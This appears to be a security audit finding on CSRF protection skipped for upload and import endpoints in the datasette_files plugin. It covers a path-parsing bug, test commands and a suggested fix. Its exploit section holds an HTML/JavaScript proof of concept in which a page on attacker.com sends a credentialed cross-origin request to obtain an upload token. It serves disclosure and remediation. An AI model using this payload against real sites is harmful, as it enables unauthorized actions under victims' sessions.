# CSRF Protection Issues on State-Changing Endpoints

**Severity**: Medium
**Category**: CSRF / Cross-Site Request Forgery
**File**: `datasette_files/__init__.py` (lines 1584–1593)
**CVSSv3 estimate**: 5.3 (Medium)

## Summary

The `skip_csrf` hook disables CSRF protection for upload and import endpoints. The code also intends to skip CSRF for delete and update endpoints but contains a bug that prevents this. Regardless of the bug, skipping CSRF on state-changing endpoints without an alternative protection mechanism (such as a custom token or API key validation) is a security concern.

## Root Cause

```python
# datasette_files/__init__.py:1584-1593
@hookimpl
def skip_csrf(datasette, scope):
    if scope["type"] != "http":
        return False
    path = scope["path"]
    if path.startswith("/-/files/upload/") or path.startswith("/-/files/import/"):
        return True
    # Match /-/files/{file_id}/-/delete and /-/files/{file_id}/-/update
    if _FILE_ID_RE.match(path.split("/")[-2] if path.count("/") >= 4 else ""):
        if path.endswith("/-/delete") or path.endswith("/-/update"):
            return True
```

### Issue 1: Upload/import endpoints skip CSRF entirely

The upload flow uses a token-based approach (prepare/upload/complete), which provides some protection since an attacker would need a valid upload token. However, the `prepare` endpoint itself skips CSRF, meaning a malicious page can obtain an upload token via a cross-origin POST.

### Issue 2: Delete/update CSRF skip has a path-parsing bug

The path for delete is `/-/files/df-aaaaa.../-/delete`. The code does `path.split("/")[-2]` which yields `"-"` (the segment before `"delete"`), not the file ID. The `_FILE_ID_RE` regex never matches `"-"`, so CSRF protection is accidentally still enforced for delete and update. But the intent to skip it is clear from the code.

## Exploit

### Reproduce with the test suite

```bash
uv run pytest tests/test_security_exploits.py::test_csrf_skip_on_upload -v
uv run pytest tests/test_security_exploits.py::test_csrf_skip_on_delete_and_update -v
```

### Upload CSRF skip

```python
scope = {"type": "http", "path": "/-/files/upload/test-uploads/-/prepare"}
result = skip_csrf(datasette=None, scope=scope)
assert result is True  # CSRF is skipped
```

A malicious page could initiate the upload flow:

```html
<!-- On attacker.com -->
<script>
fetch('https://target.com/-/files/upload/photos/-/prepare', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({filename: 'evil.svg', content_type: 'image/svg+xml', size: 100})
})
.then(r => r.json())
.then(data => {
  // Got a valid upload token — can now upload malicious content
});
</script>
```

### Delete/update path-parsing bug

```python
file_id = "df-" + "a" * 26
delete_path = f"/-/files/{file_id}/-/delete"
parts = delete_path.split("/")
# parts = ['', '-', 'files', 'df-aaa...', '-', 'delete']
# parts[-2] = '-'  (NOT the file_id)
# _FILE_ID_RE.match('-') = None
# So skip_csrf returns None (falsy) — CSRF is NOT skipped (by accident)
```

## Suggested Fix

For the upload flow, the token-based prepare/upload/complete approach is reasonable, but consider:

1. **Require an API key or session token** on the prepare endpoint instead of skipping CSRF.
2. **Remove the skip_csrf for upload paths** and instead have the upload UI include a CSRF token.
3. **Remove the dead code** for delete/update CSRF skip — these endpoints should always require CSRF protection.

```python
@hookimpl
def skip_csrf(datasette, scope):
    if scope["type"] != "http":
        return False
    path = scope["path"]
    # Only skip CSRF for the file upload content endpoint,
    # which is protected by the upload token mechanism.
    # The /-/upload endpoint receives multipart form data that
    # cannot easily include a CSRF token.
    if "/-/upload" in path and path.startswith("/-/files/upload/"):
        return True
    return False
```
